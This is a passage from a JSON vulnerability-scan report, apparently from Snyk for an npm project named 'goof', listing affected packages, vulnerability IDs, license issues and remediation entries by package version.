            "id": "uglify-js@2.6.2"
          },
          {
            "type": "packages",
            "id": "underscore@1.9.1"
          },
          {
            "type": "packages",
            "id": "word-wrap@1.2.3"
          },
          {
            "type": "packages",
            "id": "xml2js@0.4.19"
          },
          {
            "type": "packages",
            "id": "xml2js@0.4.23"
          },
          {
            "type": "packages",
            "id": "y18n@3.2.1"
          },
          {
            "type": "packages",
            "id": "yargs-parser@2.4.0"
          }
        ]
      },
      "vulnerabilities": {
        "data": [
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-ACORN-559469"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-ADMZIP-1065796"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-ANSIREGEX-1583908"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-BL-608877"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-BRACES-6838727"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-DICER-2311764"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-DUSTJSLINKEDIN-1089257"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-EJS-1049328"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-EJS-2803307"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-EJS-6689533"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-EXPRESS-6474509"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-EXPRESSFILEUPLOAD-2635697"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-EXPRESSFILEUPLOAD-2635946"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-EXPRESSFILEUPLOAD-473997"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-EXPRESSFILEUPLOAD-595969"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-GOT-2932019"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HANDLEBARS-1056767"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HANDLEBARS-1279029"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HANDLEBARS-173692"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HANDLEBARS-174183"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HANDLEBARS-469063"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HANDLEBARS-480388"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HANDLEBARS-534478"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HANDLEBARS-534988"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HANDLEBARS-567742"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HAWK-2808852"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HAWK-6969142"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HOSTEDGITINFO-1088355"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-INFLIGHT-6095116"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-INI-1048974"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-IP-6240864"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-IP-7148531"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-ISMYJSONVALID-597165"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-ISMYJSONVALID-597167"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-JQUERY-174006"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-JQUERY-565129"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-JQUERY-567880"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-JSONPOINTER-1577288"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-JSONPOINTER-598804"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-JSONSCHEMA-1920922"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-JSYAML-173999"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-JSYAML-174129"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-JSZIP-1251497"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-JSZIP-3188562"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-KERBEROS-568900"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-1018905"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-1040724"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-450202"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-567746"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-608086"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-6139239"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-73638"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-73639"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASHSET-1320032"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MARKED-174116"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MARKED-2342073"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MARKED-2342082"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MARKED-451540"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MARKED-584281"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MICROMATCH-6838728"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MINIMATCH-1019388"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MINIMATCH-3050818"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MINIMIST-2429795"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MINIMIST-559764"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MOMENT-2440688"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MONGODB-473855"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MONGOOSE-1086688"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MONGOOSE-2961688"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MONGOOSE-472486"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MONGOOSE-5777721"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MPATH-1577289"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MQUERY-1050858"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MQUERY-1089718"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-NCONF-2395478"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-NETMASK-1089716"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-NETMASK-6056519"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-PACRESOLVER-1564857"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-PARSEPATH-2936439"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-PARSEURL-2935944"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-PARSEURL-2935947"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-PARSEURL-2936249"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-PARSEURL-2942134"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-PARSEURL-3023021"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-PARSEURL-3024398"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-QS-3153490"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-REQUEST-3361831"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SEMVER-3247795"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SNYK-3037342"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SNYK-3038622"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SNYK-3111871"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SNYKDOCKERPLUGIN-3039679"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SNYKGOPLUGIN-3037316"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SNYKGRADLEPLUGIN-3038624"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SNYKMVNPLUGIN-3038623"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SNYKPYTHONPLUGIN-3039677"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SNYKSBTPLUGIN-3038626"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SNYKSNYKCOCOAPODSPLUGIN-3038625"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-TOUGHCOOKIE-5672873"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-UGLIFYJS-1727251"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-UNDERSCORE-1080984"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-WORDWRAP-3149973"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-XML2JS-5414874"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-Y18N-1021887"
          },
          {
            "type": "vulnerabilities",
            "id": "SNYK-JS-YARGSPARSER-560381"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:brace-expansion:20170302"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:braces:20180219"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:cli:20160615"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:debug:20170905"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:ejs:20161128"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:ejs:20161130"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:ejs:20161130-1"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:fresh:20170908"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:hawk:20160119"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:hoek:20180212"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:http-signature:20150122"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:jquery:20150627"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:lodash:20180130"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:marked:20150520"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:marked:20170112"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:marked:20170815"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:marked:20170815-1"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:marked:20170907"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:marked:20180225"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:mime:20170907"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:minimatch:20160620"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:moment:20161019"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:moment:20170905"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:mongoose:20160116"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:ms:20151024"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:ms:20170412"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:negotiator:20160616"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:npmconf:20180512"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:qs:20170213"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:request:20160119"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:semver:20150403"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:st:20140206"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:st:20171013"
          },
          {
            "type": "vulnerabilities",
            "id": "npm:tunnel-agent:20170305"
          }
        ]
      },
      "license_issues": {
        "data": [
          {
            "type": "license_issues",
            "id": "snyk:lic:npm:goof:GPL-2.0"
          },
          {
            "type": "license_issues",
            "id": "snyk:lic:npm:symbol:MPL-2.0"
          }
        ]
      },
      "remedies": {
        "data": [
          {
            "type": "remedies",
            "id": "@snyk/snyk-cocoapods-plugin@2.0.1:SNYK-JS-SNYKSNYKCOCOAPODSPLUGIN-3038625"
          },
          {
            "type": "remedies",
            "id": "acorn@5.7.1:SNYK-JS-ACORN-559469"
          },
          {
            "type": "remedies",
            "id": "adm-zip@0.4.11:SNYK-JS-ADMZIP-1065796"
          },
          {
            "type": "remedies",
            "id": "ansi-regex@2.1.1:SNYK-JS-ANSIREGEX-1583908"
          },
          {
            "type": "remedies",
            "id": "ansi-regex@3.0.0:SNYK-JS-ANSIREGEX-1583908"
          },
          {
            "type": "remedies",
            "id": "ansi-regex@4.1.0:SNYK-JS-ANSIREGEX-1583908"
          },
          {
            "type": "remedies",
            "id": "bl@0.9.5:SNYK-JS-BL-608877"
          },
          {
            "type": "remedies",
            "id": "bl@3.0.0:SNYK-JS-BL-608877"
          },
          {
            "type": "remedies",
            "id": "brace-expansion@1.1.4:npm:brace-expansion:20170302"
          },
          {
            "type": "remedies",
            "id": "braces@1.8.5:SNYK-JS-BRACES-6838727"
          },
          {
            "type": "remedies",
            "id": "braces@1.8.5:npm:braces:20180219"
          },
          {
            "type": "remedies",
            "id": "cli@0.6.6:npm:cli:20160615"
          },
          {
            "type": "remedies",
            "id": "debug@2.2.0:npm:debug:20170905"
          },
          {
            "type": "remedies",
            "id": "debug@3.2.6:npm:debug:20170905"
          },
          {
            "type": "remedies",
            "id": "debug@4.1.1:npm:debug:20170905"
          },
          {
            "type": "remedies",
            "id": "dicer@0.3.0:SNYK-JS-DICER-2311764"
          },
          {
            "type": "remedies",
            "id": "dustjs-linkedin@2.6.0:SNYK-JS-DUSTJSLINKEDIN-1089257"
          },
          {
            "type": "remedies",
            "id": "ejs@0.8.8:SNYK-JS-EJS-1049328"
          },
          {
            "type": "remedies",
            "id": "ejs@0.8.8:SNYK-JS-EJS-2803307"
          },
          {
            "type": "remedies",
            "id": "ejs@0.8.8:SNYK-JS-EJS-6689533"
          },
          {
            "type": "remedies",
            "id": "ejs@0.8.8:npm:ejs:20161128"
          },
          {
            "type": "remedies",
            "id": "ejs@0.8.8:npm:ejs:20161130"
          },
          {
            "type": "remedies",
            "id": "ejs@0.8.8:npm:ejs:20161130-1"
          },
          {
            "type": "remedies",
            "id": "ejs@1.0.0:SNYK-JS-EJS-1049328"
          },
          {
            "type": "remedies",
            "id": "ejs@1.0.0:SNYK-JS-EJS-2803307"
          },
          {
            "type": "remedies",
            "id": "ejs@1.0.0:SNYK-JS-EJS-6689533"
          },
          {
            "type": "remedies",
            "id": "ejs@1.0.0:npm:ejs:20161128"
          },
          {
            "type": "remedies",
            "id": "ejs@1.0.0:npm:ejs:20161130"
          },
          {
            "type": "remedies",
            "id": "ejs@1.0.0:npm:ejs:20161130-1"
          },
          {
            "type": "remedies",
            "id": "express-fileupload@0.0.5:SNYK-JS-EXPRESSFILEUPLOAD-2635697"
          },
          {
            "type": "remedies",
            "id": "express-fileupload@0.0.5:SNYK-JS-EXPRESSFILEUPLOAD-2635946"
          },
          {
            "type": "remedies",
            "id": "express-fileupload@0.0.5:SNYK-JS-EXPRESSFILEUPLOAD-473997"
          },
          {
            "type": "remedies",
            "id": "express-fileupload@0.0.5:SNYK-JS-EXPRESSFILEUPLOAD-595969"
          },
          {
            "type": "remedies",
            "id": "express@4.12.4:SNYK-JS-EXPRESS-6474509"
          },
          {
            "type": "remedies",
            "id": "fresh@0.2.4:npm:fresh:20170908"
          },
          {
            "type": "remedies",
            "id": "goof@1.0.1:snyk:lic:npm:goof:GPL-2.0"
          },
          {
            "type": "remedies",
            "id": "got@6.7.1:SNYK-JS-GOT-2932019"
          },
          {
            "type": "remedies",
            "id": "handlebars@4.0.5:SNYK-JS-HANDLEBARS-1056767"
          },
          {
            "type": "remedies",
            "id": "handlebars@4.0.5:SNYK-JS-HANDLEBARS-1279029"
          },
          {
            "type": "remedies",
            "id": "handlebars@4.0.5:SNYK-JS-HANDLEBARS-173692"
          },
          {
            "type": "remedies",
            "id": "handlebars@4.0.5:SNYK-JS-HANDLEBARS-174183"
          },
          {
            "type": "remedies",
            "id": "handlebars@4.0.5:SNYK-JS-HANDLEBARS-469063"
          },
          {
            "type": "remedies",
            "id": "handlebars@4.0.5:SNYK-JS-HANDLEBARS-480388"
          },
          {
            "type": "remedies",
            "id": "handlebars@4.0.5:SNYK-JS-HANDLEBARS-534478"
          },
          {
            "type": "remedies",
            "id": "handlebars@4.0.5:SNYK-JS-HANDLEBARS-534988"
          },
          {
            "type": "remedies",
            "id": "handlebars@4.0.5:SNYK-JS-HANDLEBARS-567742"
          },
          {
            "type": "remedies",
            "id": "hawk@1.1.1:SNYK-JS-HAWK-2808852"
          },
          {
            "type": "remedies",
            "id": "hawk@1.1.1:SNYK-JS-HAWK-6969142"
          },
          {
            "type": "remedies",
            "id": "hawk@1.1.1:npm:hawk:20160119"
          },
          {
            "type": "remedies",
            "id": "hawk@3.1.3:SNYK-JS-HAWK-2808852"
          },
          {
            "type": "remedies",
            "id": "hawk@3.1.3:SNYK-JS-HAWK-6969142"
          },
          {
            "type": "remedies",
            "id": "hoek@0.9.1:npm:hoek:20180212"
          },
          {
            "type": "remedies",
            "id": "hoek@2.16.3:npm:hoek:20180212"
          },
          {
            "type": "remedies",
            "id": "hosted-git-info@2.1.5:SNYK-JS-HOSTEDGITINFO-1088355"
          },
          {
            "type": "remedies",
            "id": "hosted-git-info@2.8.5:SNYK-JS-HOSTEDGITINFO-1088355"
          },
          {
            "type": "remedies",
            "id": "http-signature@0.10.1:npm:http-signature:20150122"
          },
          {
            "type": "remedies",
            "id": "inflight@1.0.5:SNYK-JS-INFLIGHT-6095116"
          },
          {
            "type": "remedies",
            "id": "inflight@1.0.6:SNYK-JS-INFLIGHT-6095116"
          },
          {
            "type": "remedies",
            "id": "ini@1.1.0:SNYK-JS-INI-1048974"
          },
          {
            "type": "remedies",
            "id": "ini@1.3.5:SNYK-JS-INI-1048974"
          },
          {
            "type": "remedies",
            "id": "ip@1.1.5:SNYK-JS-IP-6240864"
          },
          {
            "type": "remedies",
            "id": "ip@1.1.5:SNYK-JS-IP-7148531"
          },
          {
            "type": "remedies",
            "id": "is-my-json-valid@2.19.0:SNYK-JS-ISMYJSONVALID-597165"
          },
          {
            "type": "remedies",
            "id": "is-my-json-valid@2.19.0:SNYK-JS-ISMYJSONVALID-597167"
          },
          {
            "type": "remedies",
            "id": "jquery@2.2.4:SNYK-JS-JQUERY-174006"
          },
          {
            "type": "remedies",
            "id": "jquery@2.2.4:SNYK-JS-JQUERY-565129"
          },
          {
            "type": "remedies",
            "id": "jquery@2.2.4:SNYK-JS-JQUERY-567880"
          },
          {
            "type": "remedies",
            "id": "jquery@2.2.4:npm:jquery:20150627"
          },
          {
            "type": "remedies",
            "id": "js-yaml@3.6.1:SNYK-JS-JSYAML-173999"
          },
          {
            "type": "remedies",
            "id": "js-yaml@3.6.1:SNYK-JS-JSYAML-174129"
          },
          {
            "type": "remedies",
            "id": "json-schema@0.2.3:SNYK-JS-JSONSCHEMA-1920922"
          },
          {
            "type": "remedies",
            "id": "jsonpointer@4.0.1:SNYK-JS-JSONPOINTER-1577288"
          },
          {
            "type": "remedies",
            "id": "jsonpointer@4.0.1:SNYK-JS-JSONPOINTER-598804"
          },
          {
            "type": "remedies",
            "id": "jszip@3.2.2:SNYK-JS-JSZIP-1251497"
          },
          {
            "type": "remedies",
            "id": "jszip@3.2.2:SNYK-JS-JSZIP-3188562"
          },
          {
            "type": "remedies",
            "id": "kerberos@0.0.24:SNYK-JS-KERBEROS-568900"
          },
          {
            "type": "remedies",
            "id": "lodash.set@4.3.2:SNYK-JS-LODASHSET-1320032"
          },
          {
            "type": "remedies",
            "id": "lodash@4.17.15:SNYK-JS-LODASH-1018905"
          },
          {
            "type": "remedies",
            "id": "lodash@4.17.15:SNYK-JS-LODASH-1040724"
          },
          {
            "type": "remedies",
            "id": "lodash@4.17.15:SNYK-JS-LODASH-567746"
          },
          {
            "type": "remedies",
            "id": "lodash@4.17.15:SNYK-JS-LODASH-608086"
          },
          {
            "type": "remedies",
            "id": "lodash@4.17.15:SNYK-JS-LODASH-6139239"
          },
          {
            "type": "remedies",
            "id": "lodash@4.17.4:SNYK-JS-LODASH-1018905"
          },
          {
            "type": "remedies",
            "id": "lodash@4.17.4:SNYK-JS-LODASH-1040724"
          },
          {
            "type": "remedies",
            "id": "lodash@4.17.4:SNYK-JS-LODASH-450202"
          },
          {
            "type": "remedies",
            "id": "lodash@4.17.4:SNYK-JS-LODASH-567746"
          },
          {
            "type": "remedies",
            "id": "lodash@4.17.4:SNYK-JS-LODASH-608086"
          },
          {
            "type": "remedies",
            "id": "lodash@4.17.4:SNYK-JS-LODASH-6139239"
          },
          {
            "type": "remedies",
            "id": "lodash@4.17.4:SNYK-JS-LODASH-73638"
          },
          {
            "type": "remedies",
            "id": "lodash@4.17.4:SNYK-JS-LODASH-73639"
          },
          {
            "type": "remedies",
            "id": "lodash@4.17.4:npm:lodash:20180130"
          },
          {
            "type": "remedies",
            "id": "marked@0.3.5:SNYK-JS-MARKED-174116"
          },
          {
            "type": "remedies",
            "id": "marked@0.3.5:SNYK-JS-MARKED-2342073"
          },
          {
            "type": "remedies",
            "id": "marked@0.3.5:SNYK-JS-MARKED-2342082"
          },
          {
            "type": "remedies",
            "id": "marked@0.3.5:SNYK-JS-MARKED-451540"
          },
          {
            "type": "remedies",
            "id": "marked@0.3.5:SNYK-JS-MARKED-584281"
          },
          {
            "type": "remedies",
            "id": "marked@0.3.5:npm:marked:20150520"
          },
          {
            "type": "remedies",
            "id": "marked@0.3.5:npm:marked:20170112"
          },
          {
            "type": "remedies",
            "id": "marked@0.3.5:npm:marked:20170815"
          },
          {
            "type": "remedies",
            "id": "marked@0.3.5:npm:marked:20170815-1"
          },
          {
            "type": "remedies",
            "id": "marked@0.3.5:npm:marked:20170907"
          },
          {
            "type": "remedies",
            "id": "marked@0.3.5:npm:marked:20180225"
          },
          {
            "type": "remedies",
            "id": "micromatch@2.3.8:SNYK-JS-MICROMATCH-6838728"
          },
          {
            "type": "remedies",
            "id": "mime@1.2.11:npm:mime:20170907"
          },
          {
            "type": "remedies",
            "id": "mime@1.3.4:npm:mime:20170907"
          },
          {
            "type": "remedies",
            "id": "minimatch@0.3.0:SNYK-JS-MINIMATCH-1019388"
          },
          {
            "type": "remedies",
            "id": "minimatch@0.3.0:SNYK-JS-MINIMATCH-3050818"
          },
          {
            "type": "remedies",
            "id": "minimatch@0.3.0:npm:minimatch:20160620"
          },
          {
            "type": "remedies",
            "id": "minimatch@2.0.10:SNYK-JS-MINIMATCH-1019388"
          },
          {
            "type": "remedies",
            "id": "minimatch@2.0.10:SNYK-JS-MINIMATCH-3050818"
          },
          {
            "type": "remedies",
            "id": "minimatch@2.0.10:npm:minimatch:20160620"
          },
          {
            "type": "remedies",
            "id": "minimatch@3.0.0:SNYK-JS-MINIMATCH-1019388"
          },
          {
            "type": "remedies",
            "id": "minimatch@3.0.0:SNYK-JS-MINIMATCH-3050818"
          },
          {
            "type": "remedies",
            "id": "minimatch@3.0.0:npm:minimatch:20160620"
          },
          {
            "type": "remedies",
            "id": "minimatch@3.0.4:SNYK-JS-MINIMATCH-3050818"
          },
          {
            "type": "remedies",
            "id": "minimist@0.0.10:SNYK-JS-MINIMIST-2429795"
          },
          {
            "type": "remedies",
            "id": "minimist@0.0.10:SNYK-JS-MINIMIST-559764"
          },
          {
            "type": "remedies",
            "id": "minimist@0.0.8:SNYK-JS-MINIMIST-2429795"
          },
          {
            "type": "remedies",
            "id": "minimist@0.0.8:SNYK-JS-MINIMIST-559764"
          },
          {
            "type": "remedies",
            "id": "minimist@1.2.0:SNYK-JS-MINIMIST-2429795"
          },
          {
            "type": "remedies",
            "id": "minimist@1.2.0:SNYK-JS-MINIMIST-559764"
          },
          {
            "type": "remedies",
            "id": "moment@2.15.1:SNYK-JS-MOMENT-2440688"
          },
          {
            "type": "remedies",
            "id": "moment@2.15.1:npm:moment:20161019"
          },
          {
            "type": "remedies",
            "id": "moment@2.15.1:npm:moment:20170905"
          },
          {
            "type": "remedies",
            "id": "mongodb@2.0.46:SNYK-JS-MONGODB-473855"
          },
          {
            "type": "remedies",
            "id": "mongoose@4.2.4:SNYK-JS-MONGOOSE-1086688"
          },
          {
            "type": "remedies",
            "id": "mongoose@4.2.4:SNYK-JS-MONGOOSE-2961688"
          },
          {
            "type": "remedies",
            "id": "mongoose@4.2.4:SNYK-JS-MONGOOSE-472486"
          },
          {
            "type": "remedies",
            "id": "mongoose@4.2.4:SNYK-JS-MONGOOSE-5777721"
          },
          {
            "type": "remedies",
            "id": "mongoose@4.2.4:npm:mongoose:20160116"
          },
          {
            "type": "remedies",
            "id": "mpath@0.1.1:SNYK-JS-MPATH-1577289"
          },
          {
            "type": "remedies",
            "id": "mquery@1.6.3:SNYK-JS-MQUERY-1050858"
          },
          {
            "type": "remedies",
            "id": "mquery@1.6.3:SNYK-JS-MQUERY-1089718"
          },
          {
            "type": "remedies",
            "id": "ms@0.6.2:npm:ms:20151024"
          },
          {
            "type": "remedies",
            "id": "ms@0.6.2:npm:ms:20170412"
          },
          {
            "type": "remedies",
            "id": "ms@0.7.1:npm:ms:20170412"
          },
          {
            "type": "remedies",
            "id": "ms@0.7.3:npm:ms:20170412"
          },
          {
            "type": "remedies",
            "id": "nconf@0.10.0:SNYK-JS-NCONF-2395478"
          },
          {
            "type": "remedies",
            "id": "negotiator@0.2.8:npm:negotiator:20160616"
          },
          {
            "type": "remedies",
            "id": "negotiator@0.4.9:npm:negotiator:20160616"
          },
          {
            "type": "remedies",
            "id": "negotiator@0.5.3:npm:negotiator:20160616"
          },
          {
            "type": "remedies",
            "id": "netmask@1.0.6:SNYK-JS-NETMASK-1089716"
          },
          {
            "type": "remedies",
            "id": "netmask@1.0.6:SNYK-JS-NETMASK-6056519"
          },
          {
            "type": "remedies",
            "id": "npmconf@0.0.24:npm:npmconf:20180512"
          },
          {
            "type": "remedies",
            "id": "pac-resolver@3.0.0:SNYK-JS-PACRESOLVER-1564857"
          },
          {
            "type": "remedies",
            "id": "parse-path@4.0.1:SNYK-JS-PARSEPATH-2936439"
          },
          {
            "type": "remedies",
            "id": "parse-url@5.0.1:SNYK-JS-PARSEURL-2935944"
          },
          {
            "type": "remedies",
            "id": "parse-url@5.0.1:SNYK-JS-PARSEURL-2935947"
          },
          {
            "type": "remedies",
            "id": "parse-url@5.0.1:SNYK-JS-PARSEURL-2936249"
          },
          {
            "type": "remedies",
            "id": "parse-url@5.0.1:SNYK-JS-PARSEURL-2942134"
          },
          {
            "type": "remedies",
            "id": "parse-url@5.0.1:SNYK-JS-PARSEURL-3023021"
          },
          {
            "type": "remedies",
            "id": "parse-url@5.0.1:SNYK-JS-PARSEURL-3024398"
          },
          {
            "type": "remedies",
            "id": "qs@1.2.2:SNYK-JS-QS-3153490"
          },
          {
            "type": "remedies",
            "id": "qs@1.2.2:npm:qs:20170213"
          },
          {
            "type": "remedies",
            "id": "qs@2.2.4:SNYK-JS-QS-3153490"
          },
          {
            "type": "remedies",
            "id": "qs@2.2.4:npm:qs:20170213"
          },
          {
            "type": "remedies",
            "id": "qs@2.4.2:SNYK-JS-QS-3153490"
          },
          {
            "type": "remedies",
            "id": "qs@2.4.2:npm:qs:20170213"
          },
          {
            "type": "remedies",
            "id": "qs@6.3.2:SNYK-JS-QS-3153490"
          },
          {
            "type": "remedies",
            "id": "request@2.42.0:SNYK-JS-REQUEST-3361831"
          },
          {
            "type": "remedies",
            "id": "request@2.42.0:npm:request:20160119"
          },
          {
            "type": "remedies",
            "id": "request@2.79.0:SNYK-JS-REQUEST-3361831"
          },
          {
            "type": "remedies",
            "id": "semver@1.1.4:SNYK-JS-SEMVER-3247795"
          },
          {
            "type": "remedies",
            "id": "semver@1.1.4:npm:semver:20150403"
          },
          {
            "type": "remedies",
            "id": "semver@5.1.0:SNYK-JS-SEMVER-3247795"
          },
          {
            "type": "remedies",
            "id": "semver@5.7.0:SNYK-JS-SEMVER-3247795"
          },
          {
            "type": "remedies",
            "id": "semver@6.3.0:SNYK-JS-SEMVER-3247795"
          },
          {
            "type": "remedies",
            "id": "snyk-docker-plugin@1.38.0:SNYK-JS-SNYKDOCKERPLUGIN-3039679"
          },
          {
            "type": "remedies",
            "id": "snyk-go-plugin@1.11.1:SNYK-JS-SNYKGOPLUGIN-3037316"
          },
          {
            "type": "remedies",
            "id": "snyk-gradle-plugin@3.2.4:SNYK-JS-SNYKGRADLEPLUGIN-3038624"
          },
          {
            "type": "remedies",
            "id": "snyk-mvn-plugin@2.8.0:SNYK-JS-SNYKMVNPLUGIN-3038623"
          },
          {
            "type": "remedies",
            "id": "snyk-python-plugin@1.17.0:SNYK-JS-SNYKPYTHONPLUGIN-3039677"
          },
          {
            "type": "remedies",
            "id": "snyk-sbt-plugin@2.11.0:SNYK-JS-SNYKSBTPLUGIN-3038626"
          },
          {
            "type": "remedies",
            "id": "snyk@1.290.2:SNYK-JS-SNYK-3037342"
          },
          {
            "type": "remedies",
            "id": "snyk@1.290.2:SNYK-JS-SNYK-3038622"
          },
